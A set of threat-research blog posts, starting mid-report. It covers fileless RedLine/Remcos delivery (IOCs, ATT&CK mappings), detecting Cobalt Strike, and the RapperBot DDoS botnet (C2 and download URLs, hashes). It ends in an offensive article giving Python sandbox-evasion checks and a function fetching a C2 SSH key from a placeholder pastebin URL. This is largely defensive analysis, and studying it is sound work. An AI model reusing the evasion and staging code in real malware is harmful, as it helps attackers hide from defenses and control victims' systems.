If the path exists, the next function of this malware is to check for the user config to steal the credentials.
This function also enables RedLine to steal credentials for additional installed applications. 
Table 2 - Installs RedLine Scans for Chrome GameLauncher for Steam Filezilla Guarda Gecko Jaxx Armory Metamask Atomic Monero Coinom OpenVPN DesktopMessenger for Telegram NordVPN Discord ProtonVPN Electrum Tronlink Ethereum Yoroi Conclusion The threat actors behind this campaign used fileless delivery as a way to bypass security measures, and this technique is used by actors for a variety of objectives and motivations.
This campaign highlights that reliance on antivirus software alone is insufficient for cyber defense, and the use of legitimate code to hide malware from antivirus technology is effective and growing exponentially.
Focusing on cybersecurity training and hygiene, as well as a defense-in-depth strategy, are some recommended courses of action for countering this threat. 
Endnotes [1] “MSBuild,” Microsoft Visual Studio Docs, accessed May 3, 2021, published November 4, 2016, https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2019. 
[2] Ibid. 
[3] “What Is Fileless Malware?,” McAfee, accessed May 3, 2021, https://www.mcafee.com/enterprise/en-gb/security-awareness/ransomware/what-is-fileless-malware.html. 
[4] “Internet Security Report – Q4 2020,” WatchGuard, accessed May 4, 2021, published March 30, 2021, https://www.watchguard.com/uk/wgrd-resource-center/security-report-q4-2020, 3. 
[5] “Remcos Instructions Manual,” Breaking Security, accessed May 4, 2021, published July 2018, https://breaking-security.net/wp-content/uploads/dlm_uploads/2018/07/Remcos-Instructions-Manual-rev19.pdf, 15-16. 
[6] Daniel Frank, “Cybereason Exposes Campaign Targeting US Taxpayers with NetWire and Remcos Malware,” Cybereason, accessed May 4, 2021, published March 18, 2021, https://www.cybereason.com/blog/cybereason-exposes-malware-targeting-us-taxpayers. 
Appendix A IOCs Project File Payload C2 Details 45c94900f312b2002c9c445bd8a59ae6 Remcos 04fc0ca4062dd014d64dcb2fe8dbc966 135.181.170.169:50845 d8a57534382a07cc0487b96350bca761 Remcos eb8b1d64429e00f2b3b49f886ee3b0b4 http://dl4.joxi.net/drive/2021/04/15/0048/3592/3153416/16/b8c104ce64.png d52d6bad3d11e9a72998608ccca572f5 Remcos 41c0bb6e89ad89af8eef7bec40d4acbb d66740b3ed3884c31d40e3747684411e RedLine 302207c3248257d4d9badf4bc4b75483 svhost-system-update.net:80 http://dl4.joxi.net/drive/2021/04/19/0048/3592/3153416/16/d07409594a.proj 43660f882cc5971ab83a810398487317 RedLine 6d3e8a2802848d259a3baaaa78701b97 37.1.206.16:7575 192b8ee95537dda7927ba3b45183e6a4 Remcos b8e9ce084d9d49f565f850c59b003bcf http://joxi.net/52ap4j7tkJER7m.proj 1ae425ac2890283ddcf11946e7e8f6ae QuasarRat 723f5e75239b66e3d08b83a131c7b66c 20621960888a6299123ce5a2df5eabba Remcos f174c03d177a04e81677e9c9a9eae0c8 27b62f7b4b285b880b8c81960aa60b15 Remcos cf45b793bc9ec86bfedfa165c01ede15 2d15a4c9184878e25bdf108bd58290b8 Remcos de2ff99ca086a8ad0f9b8027aef696ba 37bbbbc44c80ff4fe770ce78f6a37ebd Remcos 73790d28f4f8f0f4c402da66c8dc393f 603b1cc2d5488dcd8bb0a3b14429c88b Remcos 23c5bc4a2e69c3f171561b524ceb4098 62c8efb35b3b9c10e965ec5a236fed2d Remcos 4def35aedc86a946c13118e14127e0e9 a948e8d3222b9fa8ccbd091230098b78 Remcos 85c700ff566161c77a03f282fa48a246 ecdb2860af9ce2754d178c80e3303080 QuasarRat 7870a7c7e355d1fbf357c846d8bf2aea fe84ead033bfeaee70f84d8733b51e08 RedLine 4023e57ffbc87aa93621a7c2a6f0b425 Appendix B MITRE ATT&CK TTPs Matrix Technique ID Name Execution T1059.003 Windows Command Shell T1059.006 Python Persistence T1547.009 Shortcut Modification T1547.001 
Registry Run Keys / Startup Folder Privilege Escalation T1548.002 Abuse Elevation Control:
Bypass User Account Control T1055 Process Injection T1055.012 Process Hollowing Defense Evasion T1140 Deobfuscate/Decode Files or Information T1112 Modify Registry T1027 Obfuscated Files or Information T1055 Process Injection T1055.002 Portable Executable Injection T1055.012 Process Hollowing T1127 Trusted Developer Utilities Proxy T1127.001 MSBuild T1497.001 System Checks T1218.005 Signed Binary Proxy Execution: Mshta Credential Access T1555 Credentials from Password Stores T1555.003 Credentials from Web Browsers T1539 Steal Web Session Cookie T1056 Input Capture T1056.001 Keylogging Discovery T1087 Account Discovery T1083 File and Directory Discovery T1518 Software Discovery T1518.001 Security Software Discovery T1082 System Information Discovery T1614 System Location Discovery T1033 System Owner/User Discovery T1124 System Time Discovery Collection T1123 Audio Capture T1115 Clipboard Data T1113 Screen Capture T1125 Video Capture Command and Control T1105 Ingress Tool Transfer T1090 Proxy Exfiltration T1041 Exfiltration Over C2 Channel Appendix C Zero Detection on VirusTotal 
title: How to Detect Cobalt Strike url: https://www.intezer.com/blog/malware-analysis/cobalt-strike-detect-this-persistent-threat/ Cobalt Strike is a penetration testing tool created by Raphael Mudge in 2012.
To this day, it remains extremely popular in red team activities and used for malicious purposes by threat actors.
Cobalt Strike is popular due to its range of deployment options, ease of use, ability to avoid detection by security products, and the number of capabilities it has.
It is for these reasons that threat actors also like Cobalt Strike.
Since Cobalt Strike is widely used by a range of actors, its lack of exclusivity makes attribution harder. 
Companies still struggle to detect Cobalt Strike also due to the various defensive techniques it has.
This blog explains Cobalt Strike and practical steps to take if you believe that you are being targeted by Cobalt Strike or already compromised.
We will demonstrate some real world examples of Cobalt Strike delivery and steps to detect each. 
What is Cobalt Strike? Cobalt Strike is marketed as “Software for Adversary Simulations and Red Team Operations.”
It is a popular platform that allows users to emulate advanced threats, perform reconnaissance, hide communications, escalate privileges, move laterally across the network, and deploy additional payloads.
The main payload of Cobalt Strike is called “Beacon.”
The Beacon payload is used to model advanced APT malware, and can do the following: Receive commands (either passively or from an interactive console) Egress communications over HTTP, HTTPS, and DNS Launch PowerShell Execute binaries Modify and query the Windows registry Inject malicious code into legitimate processes Log keystrokes Take screenshots Set up proxies Escalate privileges Bypass UAC Dump password hashes Scan ports among other abilities This tool is mainly used in red team operations for government agencies and private enterprises, but it’s also a popular tool leveraged by cybercrime and APT groups in cracked versions.
It is evident why Cobalt Strike is used by organizations and threat actors alike because of the extensive suite of capabilities it possesses, and also due to its ability to bypass defenses.
It also comes with the feature to generate reporting in which the attacking team or threat actor can continuously study and improve their campaigns. 
Why is it difficult to detect Cobalt Strike? Cobalt Strike is difficult to detect because of its several defense techniques.
Cobalt Strike payloads are usually shellcode encrypted with a rolling XOR key.
This makes static analysis difficult to conduct.
This, combined with the ability to configure many parts of the payload, makes hash-based detection almost impossible.
Cobalt Strike stagers are designed to be loaded and executed only in-memory.
This opens up a ton of possibilities for how this shellcode is shipped, making signature-based detection on the delivery method a cat and mouse game.
Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory. 
How has Cobalt Strike been deployed? 
Cobalt Strike has many different ways for deployment.
This flexibility has helped attackers find many unconventional and creative ways to infect victims with a payload.
For an in-depth technical analysis of Cobalt Strike’s deployment options and how they differ, check out Avast’s blog or this Cisco Talos white paper.
Let’s take a look at some real world examples of how Cobalt Strike is being used in the wild.
We will cover the following: Macro-Laden Microsoft Office files Supply Chain Attack Living off the Land (LotL) Executables (EXE) files Macro-Laden Microsoft Office Files An example of a Cobalt Strike payload being delivered to victims via Microsoft Excel spreadsheets demonstrates that this tool is also used in mass phishing campaigns, not just targeted APT attacks.
The attack starts by sending potential victims a Microsoft OneDrive link from which an Excel (.xls) file is downloaded.
OneDrive URLs sent to victimsUsing cloud storage links to deliver malicious files is a well-known strategy.
It leverages the good reputation of cloud provider domains such as Microsoft, Amazon, and Google to bypass domain reputation-based security controls.
This link delivers an Excel file pretending to be an Apple Store invoice requesting the target “enable content to view receipt.
”Spreadsheet lure masquerading as an Apple Store receiptUpon enablement of macros, the spreadsheet will fetch and execute the payload in-memory. 
How to Detect? 
This can be difficult to detect, as there are multiple degrees of separation before the Cobalt Strike payload is executed.
Detection first requires dynamic analysis in order to reach the Cobalt Strike stage.
When this stage is reached, the best ways to detect the running Cobalt Strike code are through static signatures or genetic code analysis.
When it comes to static signatures, it can be difficult to isolate the exact area in-memory that you should run the signatures over.
One way this can be achieved is running the file through debugging tools and manually dumping memory to perform signature analysis. 
This can be extremely time consuming and requires a high degree of technical knowledge.
Another possible way is to use a sandbox and download memory dumps from a finished analysis in order to run static analysis tools.
This requires slightly less technical knowledge but it still can be time consuming.
We suggest taking the suspicious document and uploading it to Intezer Analyze to find out if Cobalt Strike is hidden in-memory.
Intezer Analyze result for Cobalt Strike payload Supply Chain Attack One of the biggest cybersecurity stories of 2020 was the SolarWinds supply chain attack that compromised high-profile entities around the world.
This attack was done by an APT group known as NOBELIUM (UNC2452) leveraging the “Orion” business software to distribute malware to private and public organizations.
Among the deployed malware was a Cobalt Strike loader dubbed TEARDROP by FireEye.
The variant was named Raindrop by Symantec.
The TEARDROP dropper is a memory-only DLL that runs as a service spawning a thread that pulls the Cobalt Strike payload from a fake JPG file.
The Raindrop variant is built from a modified version of 7-ZIP source code.
It uses a different custom packer than TEARDROP, also leveraging steganography to locate the start of the encoded payload.
Once the encoded payload has been located, it extracts, decrypts, and decompresses the data to be executed as shellcode. 
It can often be difficult to detect if your organization has been the victim of a supply chain attack.
It can be especially hard to collect forensic evidence for an attack when it could be mixed in with the code of legitimate and large files.
Due to the nature of supply chain attacks, there are often a large number of machines in an organization infected at one time.
An action you can take is to run Intezer’s live endpoint scanner across all machines in the organization.
This will give you immediate visibility over all running code and quickly identify infected machines by detecting any traces of malicious code found in-memory.
An example of a machine with Raindrop loading Cobalt Strike is shown in the endpoint scan below.
Intezer Analyze endpoint scan result for Raindrop loading and executing a fileless Cobalt Strike payload Living off the Land (LotL) Living off the Land (LotL) is the attack process of using legitimate and signed tools, usually provided within the operating system, to execute malware.
This is a powerful tactic as it can result in unauthorized code being executed within the memory space of a trusted process, evading malware defenses by flying under the radar.
This type of tactic also makes incident response difficult, since analysts can’t just filter out known legitimate processes during triage.
All processes must be inspected in order to find that one needle in the haystack.
One popular tool used for LotL operations is the Microsoft.
NET framework utility called MSBuild.
MSBuild is the build platform used for Microsoft and Visual Studio.
Visual Studio relies on MSBuild to build projects for testing and releases.
Attackers are able to pass MSBuild.exe, a project (.proj) file, to build and execute.
The payload, usually shellcode, is injected into another process.
This attack is effective for attackers as many sandboxing solutions are not able to handle project files and struggle with fileless malware.
This technique was observed by Cisco Talos researchers in 2020 to deploy Cobalt Strike.
Project file codeAs shown above, the project file has an encoded and compressed payload.
This payload is decrypted, decompressed, and then copied into memory.
The shellcode is then executed in a new thread. 
An endpoint with a system injected with Cobalt Strike via MSBuild is shown below.
Note the process tree at the bottom indicating the “fileless code.
”Intezer Analyze endpoint scan of a Cobalt Strike-infected system via LotL technique Executables (EXE) Files There is an acronym in the United States Armed Forces called “KISS.”
KISS stands for “Keep it simple, stupid!”
Sometimes simple is better, and another way for Cobalt Strike to be deployed is in a simple Windows EXE form.
This requires either social engineering tactics to get the target to execute the malware or another program/script to execute the file.
This process involves creation of a thread that sets up a named pipe for privilege escalation.
Once the shellcode is written to the named pipe, it is decrypted and executed in a separate thread. 
An example of one of these payloads is shown in the analysis below.
Notice how the Cobalt Strike code is only shown when it is executed and found in-memory.
Cobalt Strike found via memory analysis How can Cobalt Strike be detected and remediated? 
Due to the many ways Cobalt Strike is deployed, detection can be hard.
The use of shellcode, encoding, compression, obfuscated strings, process injection, hashing algorithms, domain fronting, different communication channels, and dynamically loaded libraries all give malware and network defenses a run for their money. 
Static Analysis Static analysis involves examining the file using various techniques without actually having to execute the file itself.
Static analysis can involve hashing the file and finding intel on it, taking a look at the strings to see if there are functionality or network indicators, or checking imports and running signatures such as YARA for the file.
Although useful, static analysis on its own is probably not sufficient to detect Cobalt Strike.
Using hash-based identification of Cobalt Strike is insufficient, since each payload will be encrypted with different keys and each configuration will uniquely change the hash value.
It is trivial to generate a new payload for each new target.
Checking strings may be insufficient also.
Strings for pipe names are dynamically generated and incorporate random numbers, meaning they can change every time the malware is executed.
Encrypted payloads will also obfuscate useful strings from static analysis.
API Hashing algorithms employed by Cobalt Strike hide imports from static analysis techniques.
Signature-based detection is great for detecting malware, but due to the versatility of Cobalt Strike’s deployment using multiple stages and encrypted/obfuscated payloads, an analyst may only be able to detect that a file is going to load and execute a payload in-memory.
Without dynamic analysis, they won’t be able to detect exactly what that payload will be. 
Dynamic Analysis Dynamic analysis is the process of executing the suspect file in order to analyze its behavior and how it affects the environment it runs in.
Dynamic analysis can open up new areas to explore as one can follow the malware through each stage of its deployment and functionality.
Dynamic analysis can get the malware to unpack, decode, or download additional stages.
These new stages are then subject to further dynamic analysis as well as the previously mentioned static analysis techniques.
Dynamic analysis does not have many limitations, although some malware includes functionality to detect if it is being observed or running inside a sandboxed environment.
There is also the possibility that during dynamic analysis, areas of malicious code may not be intentionally executed, and thus not detected in the behavior.
The best way to detect malicious code is via genetic code analysis which is done automatically for you in Intezer Analyze. Combination of Several Techniques The best way to detect Cobalt Strike code is through a combination of dynamic, static, and genetic analysis.
Let’s take a suspicious looking document from an unknown entity as an example.
Before opening the document, we submit it to Intezer Analyze and get the verdict, as shown below.
Intezer Analyze result showing in-memory Cobalt Strike codeThe document drops and executes Cobalt Strike in the memory space of “rundll32.exe.”
Signatures are leveraged to show capabilities and file characteristics.
Under the “TTPs” tab the user can see the techniques/capabilities employed by the malicious document.
TTPs section showing capabilities detected during executionThe document displays interesting techniques such as macros with auto-execution, network activity with a unique user agent, office process starting martian subprocess, and process injection.
You can also dive deeper into capabilities specific to the injected Cobalt Strike process.
The “IoCs” tab in Intezer Analyze shows indicators that can help you pivot and search in your environment during investigations to map out the scope of an attack.
IoCs provide you with file hashes and network indicators such as URLs, and IP addresses being contacted through irregular ports.
IoCs tab showing file and network
indicatorsThe “Behavior” tab shows a more in-depth analysis of the file’s behavior, where you can see the process tree, network activity, screenshots and file/registry activity.
Behavior tab showing observed behavior during sandbox execution The Only Abused Pen Testing Tool? Cobalt Strike is not the only penetration testing or legitimate tool that has been co-opted and abused by threat actors.
In the past, tools such as Pafish (Paranoid Fish) have been used by Iranian actors in their tooling for virtual machine (VM) detection.
The “Sysinternals” suite has been used extensively by threat actors.
Most notably, PsExec has been used in high-profile attacks such as the 2017 NotPetya global ransomware outbreak.
More recently, legitimate and penetration testing tools for the cloud have been used by threat actors.
The threat actor TeamTNT has used Weave Scope, a trusted tool which gives the user full access to their cloud environment, and is integrated with Docker, Kubernetes, the Distributed Cloud Operating System (DC/OS), and AWS Elastic Compute Cloud (EC2).
The attacker installs this tool in order to map the cloud environment of their victim and execute system commands without needing to deploy malicious code on the server.
The same group has also been documented using the penetration testing tool Break Out The Box (BOTB) for cloud and containerized environments. 
Get Started for Free With Intezer Analyze, you can analyze any suspicious files that you encounter, including non-executable files such as Microsoft Office documents, scripts, archives, and more.
Stay on top of analyzing and classifying Cobalt Strike and other threats.
Get started for free and start with 50 file uploads per month.
The post How to Detect Cobalt Strike appeared first on Intezer. 
title: New RapperBot Campaign – We Know What You Bruting for this Time url: https://www.fortinet.com/blog/threat-research/new-rapperbot-campaign-ddos-attacks After FortiGuard Labs reported on RapperBot in our previous article titled So RapperBot, What Ya Bruting For? in August 2022, there was a significant drop in the number of samples collected in the wild.
But in early October 2022, new samples with the same distinctive C2 protocol used by RapperBot were detected. 
Unlike the murky objectives of the previous campaign, it is quickly evident that these samples are part of a separate campaign to launch Distributed Denial of Service (DDoS) attacks against game servers, which we believe to be a re-emergence of a similar campaign from earlier this year. 
Affected Platforms: LinuxImpacted Users: Any organizationImpact: 
Remote attackers gain control of the vulnerable systemsSeverity Level: Critical This article discusses the differences observed in this campaign and its relation to the previous RapperBot and similar campaigns in the past. 
RapperBot Rebooted FortiGuard Labs encountered this campaign by hunting for samples using the unique bot ID used by RapperBot to communicate with its Command-and-Control (C2) server, as reported in the previous article. 
But once we analyzed these new samples, we observed a significant difference between them and the earlier campaign.
In fact, it turns out that this campaign is less like RapperBot than an older campaign that appeared in February and then mysteriously disappeared in the middle of April.
Other related campaigns uncovered during this investigation are detailed later in this article. 
Network Protocol and Denial-of-Service (DoS)
Attacks The C2 network protocol used in previous campaigns remains essentially unchanged, with additional commands added to support the Telnet brute force.
The list of commands and IDs are shown below: 0x00: Register (used by the client) 
0x01: Keep-Alive/Do nothing 0x02: Stop all DoS attacks and terminate the client 0x03: Perform a DoS attack 0x04: Stop all DoS attacks 0x06: Restart Telnet brute forcing 0x07: Stop Telnet brute forcing The previously reported RapperBot campaign was limited to a few generic DoS methods against TCP and UDP services.
This campaign adds DoS attacks against the GRE protocol (likely reusing the Mirai source code) and the UDP protocol used by the Grand Theft Auto: San Andreas Multi Player (SA:MP) mod. 
Here are the DoS attack commands supported by this botnet: 0x00: Generic UDP flood 0x01: TCP SYN flood 0x02: TCP ACK flood 0x03: TCP STOMP flood 0x04: UDP SA:MP flood targeting game servers running GTA San Andreas:
Multi Player (SA:MP) 0x05: GRE Ethernet flood 0x06: GRE IP flood 0x07: Generic TCP flood These specific commands, coupled with the absence of HTTP-related DDoS attacks, suggests that this campaign is primarily geared toward game server DDoS. Telnet Self-propagation The most significant difference in the new campaign was the complete replacement of the SSH brute forcing code with the more usual Telnet equivalent.
FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim. 
The Telnet brute forcing code is designed primarily for self-propagation and resembles the old Mirai Satori botnet.
Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2. 
These credentials used appear to be default credentials for IoT devices.
To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings to identify the possible device and then only tries the known credentials for that device.
Unlike less sophisticated IoT malware, this allows the malware to avoid trying to test a full list of credentials.
While not exactly a novel technique, it is still uncommon compared to other IoT botnets. 
Based on the prompt messages hardcoded into the malware, most of the targeted devices are IoT devices such as routers and DVRs.
This campaign seems especially interested in older devices with the Qualcomm MDM9625 chipset, such as LTE modems.
It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary. 
Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised device’s IP address, and its architecture to the C2 server on a separate port, 5123.
After reporting, the malware attempts to install its main payload binary on the compromised device. 
It first parses the Executable and Linkable Format (ELF) header of the /bin/busybox file for the e_machine field, which provides the architecture of the compromised device.
This allows it to download and deploy a RapperBot payload of the correct architecture to ensure proper execution.
This selective behavior is more efficient than the shotgun approach in most IoT malware families, whereby all the binaries for the supported architectures are downloaded and executed in the victim's system. 
Based on the payload binaries we collected, this botnet currently seems to only target devices running on ARM, MIPS, PowerPC, SH4, and SPARC architectures.
Moreover, it specifically checks and stops its self-propagation if the device is detected to be running on Intel processors. 
The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload. 
If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload. 
Unlike in Satori, these embedded downloaders are stored as escaped byte strings, probably to simplify parsing and processing within the code. 
The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.
As labeled in Figure 4, each binary has a hardcoded URL for downloading the payload binary of the proper architecture. 
No attempts to persist on infected or brute-forced devices were observed for this campaign. 
Related Campaigns FortiGuard Labs compared samples for this and related campaigns from the past to find any links with the previously reported RapperBot campaign. 
We observed that the earliest samples for this campaign were from December 2021 and that the SA:MP attack was only added in February 2022.
This campaign mysteriously disappeared in mid-April 2022, resurfacing in Oct 2022 with the addition of the self-propagation feature. 
We also found older samples from another campaign that was active in August-September 2021 with an almost identical list of credentials.
These samples contain slightly fewer credentials and a simpler self-propagation code that only supports downloading the payload via wget or the binary downloader embedded directly into the sample.
This campaign did not support stopping or restarting the Telnet propagation, and while the samples support the same commands, their associated IDs did not match. 
The similar lists of credentials suggest that the threat actor behind this current campaign has access to the source code for the earlier campaign, as this code was not found in other IoT malware samples. 
Connections to RapperBot The fact that samples from both campaigns use the same C2 protocol, coupled with the absence of this campaign during the RapperBot campaign active between June and Aug 2022 and its recent reappearance, seems to be more than a coincidence. 
With the several similarities between the two campaigns outlined below, we believe that either the same threat actor might be behind both campaigns or each campaign might have branched from the same privately-shared source code. 
The C2 commands and corresponding IDs are identical in both campaigns (excluding the Telnet-related commands, as those do not apply to RapperBot) Both campaigns show a certain degree of effort in optimizing the brute forcing implementation.
Code for the brute forcing implementation is significantly more structured than typical IoT malware that copies and pastes code with minimal modifications. 
RapperBot also supported the TCP STOMP attack popularized by Mirai.
This attack was not observed in the earlier campaigns mentioned above.
However, as both Mirai and Satori source code are publicly available, this is considered a very weak link between the campaigns. 
If both campaigns were related, the reason for restarting an older campaign remains a mystery. 
Conclusion Based on the undeniable similarities between this new campaign and the previously reported RapperBot campaign, it is highly likely that they are being operated by a single threat actor or by different threat actors with access to a privately-shared base source code. 
Unlike the previous RapperBot campaign, this new campaign has a clear motivation to compromise as many IoT devices as possible to build a DDoS botnet. 
Although this new campaign has evolved significantly from previous campaigns, mitigating it remains the same—setting strong passwords for all devices connected to the internet. 
FortiGuard Labs will continue to monitor RapperBot’s development. 
Fortinet Protections The FortiGuard Antivirus service detects and blocks this threat as ELF/Mirai, Linux/Mirai, and ELF/Gafgyt. 
The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions.
Customers running current AntiVirus updates are protected. 
FortiGuard Labs provides the Rapper.
Botnet IPS signature against RapperBot C2 activity. 
The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. 
FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. 
IOCs Files 3d5c5d9e792e0a5f3648438b7510b284f924ab433f08d558b6e082e1d5414a03 7afcac5f71e9205879e0e476d3388898a62e7aa4a3e4a059884f40ea36cfd57f 8ec79a35700f6691f0d88d53647e9f2b75648710ecd119e55815331fc3bdd0b5 a12ad4bc394d60bc037271e1c2df1bd2b87bdaaba85f6c1b7d046341f027cc2d f000bf482040b48595badee1fc56afb95449ac48b5dc35fe3a05542cbf18f658 4aa9175c1846557107ec197ea73d4cc8dbe6d575a8fd86ae214ff9b3a00e438b f98261eb7dc122449c158118cc9c660683206983a9e90ff73eb88c4705e0c48e Download URLs hxxp://185[.]216[.]71[.]149/armv4l hxxp://185[.]216[.]71[.]149/armv5l hxxp://185[.]216[.]71[.]149/armv6l hxxp://185[.]216[.]71[.]149/armv7l hxxp://185[.]216[.]71[.]149/mips hxxp://185[.]216[.]71[.]149/mipsel hxxp://185[.]216[.]71[.]149/powerpc hxxp://185[.]216[.]71[.]149/sparc hxxp://185[.]216[.]71[.]149/sh4 hxxp://185[.]216[.]71[.]149/bot_arm4_el hxxp://185[.]216[.]71[.]149/bot_arm5_el hxxp://185[.]216[.]71[.]149/bot_arm6_el hxxp://185[.]216[.]71[.]149/bot_arm7_el hxxp://185[.]216[.]71[.]149/bot_mips_eb hxxp://185[.]216[.]71[.]149/bot_mips_el hxxp://185[.]216[.]71[.]149/bot_sh_el C2 185[.]216[.]71[.]149 Learn more about Fortinet’s FortiGuard Labs threat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Services portfolio.
Sign up to receive our threat research blogs. 
title: Inside the Mind of a Cyber Attacker: from Malware creation to Data Exfiltration (Part 1) url: https://blog.hacktivesecurity.com/index.php/2023/06/05/inside-the-mind-of-a-cyber-attacker-from-malware-creation-to-data-exfiltration-part-1/ 2 0 DISCLAIMER – This article is provided for educational and informational purposes only.
The techniques, tools, and examples discussed are intended to promote a better understanding of cybersecurity and to enhance defensive measures.
The usage of these techniques should strictly adhere to applicable laws, regulations, and ethical guidelines.
The author and publisher of this article shall not be held responsible for any misuse or illegal activities conducted by individuals or entities based on the information provided. 
Additionally, it’s important to note that the usage of Ngrok in conjunction with MaccaroniC2 tool may result in the violation of the terms of service or policies of certain platforms.
It is advisable to review and comply with the terms of use of any platform or service to avoid potential account bans or disruptions. 
Introduction Embark on a journey into the intricate world of cyber attacks as we unravel paths taken by adversaries from malware creation to data exfiltration. 
In this comprehensive exploration, we delve into the stages that comprise the attack lifecycle, analyzing the process from infecting to exfiltration, with a particular focus on weaponization. 
Presenting MaccaroniC2 In this article, we’ll explore MaccaroniC2 ( https://github.com/CalfCrusher/MaccaroniC2 ), a proof-of-concept Command & Control framework that leverages the versatile features of the AsyncSSH Python library ( https://asyncssh.readthedocs.io ) with the integration of PyNgrok, a wrapper for Ngrok ( https://ngrok.com ). 
This tool is designed to address a specific scenario where the victim operates an AsyncSSH server and establishes an external tunnel, eagerly awaiting commands from the attacker.
By harnessing the powerful capabilities of the AsyncSSH library, which provides an exceptional implementation of the SSHv2 protocol, this tool ensures efficient and secure communication between the attacker and the victim. 
Some key features of the AsyncSSH library include: Asynchronous Execution: AsyncSSH is built with asynchronous programming in mind, allowing you to perform SSH operations concurrently without blocking the execution flow. 
SSH Protocol Support: It provides support for various SSH protocol versions, including SSH1, SSH2, and the ability to negotiate and handle different encryption and authentication methods. 
Key-Based Authentication: AsyncSSH supports public key authentication, allowing you to authenticate with SSH servers using key pairs instead of passwords. 
SFTP Support: It includes a built-in SFTP (SSH File Transfer Protocol) implementation, enabling you to securely transfer files between the local and remote systems over the SSH connection. 
Event-driven API:
The library follows an event-driven programming model, allowing you to register event handlers and callbacks to handle SSH-related events such as connection establishment, authentication, command execution, and data transfer. 
In a hardened network environment scenario, establishing a connection to an Ngrok server can be easily detected by EDR (Endpoint Detection and Response) systems and other tools designed to monitor network traffic.
To avoid raising suspicion and maintaining a higher level of control over the server setup, it is recommended to use a self-hosted server instead of Ngrok. 
Check the project: https://github.com/CalfCrusher/MaccaroniC2 Weaponizing malware: MaccaroniC2 with steroids In real-world scenarios, it is essential to embrace the mindset of a determined threat actor striving to enhance the effectiveness of their malware while maintaining covert operations. 
With this objective in mind, we will delve into custom modifications to the server side of MaccaroniC2, uncovering fundamental concepts that enable us to effectively weaponize our tool for diverse real-world scenarios. 
Virtualization/Sandbox Evasion are those techniques utilized by adversaries as a part of their defense evasion strategy to detect and avoid virtualization and analysis environments, such as malware analysis sandboxes. 
Sandbox evasion is indeed a complex and evolving field.
While it’s not possible to cover all aspects of sandbox evasion in just a few lines of Python code, we’ll see some general basic techniques and concepts that can be used to try to recognize a sandbox or a virtual environment: 
# Technique 1: Check for common sandbox-related processes sandbox_processes =
["vmsrvc.exe", "vmusrvc.exe", "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmacthlp.exe", "vmtools.exe", "df5serv.exe"] running_processes = subprocess.check_output("tasklist", shell=True).decode().lower() 
This code essentially checks if certain processes that are commonly associated with sandbox environments or virtual machines are running.
This information can be helpful in determining whether the code is running in a protected or controlled environment rather than on a regular user’s machine. 
# Technique 3: Check if running in a sandboxed network environment sandboxed_networks =
["10.0.2.
", "192.168.44.
", "172.16.0.
", "172.16.1.", "172.16.2.", "172.16.3.", "172.16.4.
", "172.16.5.", "172.16.6.", "172.16.7.", "172.16.8.", "172.16.9.", "172.16.10.", "172.16.11.", "172.16.12.", "172.16.13.", "172.16.14.", "172.16.15."] local_ip = socket.gethostbyname(socket.gethostname()) 
Here we can see how this code comparing the local IP address with a predefined list of network addresses typically associated with sandboxed environments.
If the local IP address matches any of the addresses in the list, it suggests that the program could be ran in a sandboxed environment.
It’s just the first clue but we have to start somewhere ;). 
# Technique 4: Check for virtualized CPU features cpu_info = cpuinfo.get_cpu_info() virtualized_cpu_features =
["hypervisor", "vmx", "svm", "vmm", "nx"] if any(feature in cpu_info["flags"] for feature in virtualized_cpu_features): return True 
Here we can see another piece of code that checks for virtualization by examining the CPU features.
It uses the cpuinfo Python module to retrieve information about the CPU.
The code defines a list of virtualized CPU features and then checks if any of these features are present in the CPU information’s “flags” field.
If any feature is found, the code returns True, indicating the presence of virtualization. 
# Technique 5: Check if disk size is greater than 50 GB min_disk_size_gb = 50 if len(sys.argv) >
1: min_disk_size_gb = float(sys.argv[1]) _, disk_size_bytes, _ = win32api.
GetDiskFreeSpaceEx() disk_size_gb = disk_size_bytes / 1073741824 
if disk_size_gb > min_disk_size_gb: return False # Proceed else: return True # Not Proceed This code checks if the disk size is greater than a specified threshold (50 GB as example).
It uses the win32api.
GetDiskFreeSpaceEx() function to retrieve the disk size in bytes.
It converts the size to gigabytes by dividing it by 1073741824 (the number of bytes in a gigabyte).
After comparing the disk size in gigabytes to the specified min_disk_size_gb, if the disk size is greater, the code returns False. 
However, if the disk size falls below the minimum threshold, it returns True, signaling that the script should stop from proceeding further because we assume that we’re inside a VM environment or a sandbox. 
It should be noted that these techniques are basic examples and represent fundamental practices in the field of malware development and sandbox detection. 
Let’s go further. 
In MaccaroniC2 original tool, the SSH Pub Key is hardcoded.
What about requesting it every time script is running ? 
In this case we choose to host it online for multiple reasons: Usually, attackers employs techniques by leveraging third-party services such pastebin.com and similars, to store piece of code or stagers.
This method of operation, widely utilized by advanced threat actors, is a classic within the realm of Advanced Persistent Threats (APTs). 
By employing multiple layers of staging, the attacker artfully conceals the true nature of the malware, placing it several steps removed from the initial infection. 
def get_pub_key(): """Get SSH pub key from third party service""" try: global PRIVATE_KEY global AUTHORIZED_KEY url = "https://pastebin.com/raw/XXXXXXX" r = requests.get(url) if r.status_code == 200: pub_key
= r.text.strip('\n') elif r.status_code == 404: exit() #
So Long, and Thanks for All the Fish! 
except: exit('[-]
Error: Could not get SSH pub key') 
As we can see, in this approach we take a different path by avoiding the hardcoding of the pub_key and instead harnessing the advantages provided by services such as pastebin.com, transfersh.com or similar services.
